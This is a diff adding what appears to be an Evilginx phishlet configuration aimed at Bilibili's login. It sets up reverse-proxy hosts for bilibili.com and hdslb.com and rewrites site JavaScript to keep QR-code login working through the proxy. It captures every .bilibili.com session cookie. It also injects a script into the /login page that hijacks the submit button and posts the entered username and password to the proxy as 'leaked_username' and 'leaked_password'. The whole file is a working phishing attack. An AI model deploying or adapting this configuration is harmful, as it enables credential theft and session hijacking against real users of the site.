@@ -1,0 +1,54 @@
+author: '@fate0'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'bilibili.com', is_landing: true, session: true}
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'biligame.com'}
+  - {phish_sub: 's1', orig_sub: 's1', domain: 'hdslb.com'}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'bilibili.com'}
+  - {phish_sub: 'data', orig_sub: 'data', domain: 'bilibili.com'}
+  - {phish_sub: 'i0', orig_sub: 'i0', domain: 'hdslb.com'}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'hdslb.com'}
+
+sub_filters:
+  - {triggers_on: 's1.hdslb.com', orig_sub: 'i0', domain: 'hdslb.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/css']}
+  - {triggers_on: 's1.hdslb.com', orig_sub: 's1', domain: 'hdslb.com', search: 'withCredentials:!', replace: 'withCredentials:!!', mimes: ['text/html', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 's1.hdslb.com', orig_sub: 'i0', domain: 'hdslb.com', search: 't\.data\.url', replace: "t.data.url.replace(/https:\\/\\/[\\w.]+\\/qrcode\\/h5\\/login/, 'https://passport.bili'+'bili.com/qrcode/h5/login')", mimes: ['application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.bilibili.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/crossDomain'
+
+credentials:
+  username:
+    key: 'leaked_username'
+    search: '(.*)'
+  password:
+    key: 'leaked_password'
+    search: '(.*)'
+login:
+  domain: 'passport.bilibili.com'
+  path: '/login'
+
+
+js_inject:
+  - trigger_domains: ["passport.bilibili.com"]
+    trigger_paths: ["/login"]
+    script: |
+      function lp(){
+        var submit = document.querySelector("#geetest-wrap > div > div.btn-box > a.btn.btn-login");
+        submit.setAttribute("onclick", "sendPassword()");
+        return;
+      }
+      function sendPassword(){
+        var username = document.querySelector("#login-username").value;
+        var password = document.querySelector("#login-passwd").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("leaked_password="+encodeURIComponent(password)+'&leaked_username='+username);
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2000);
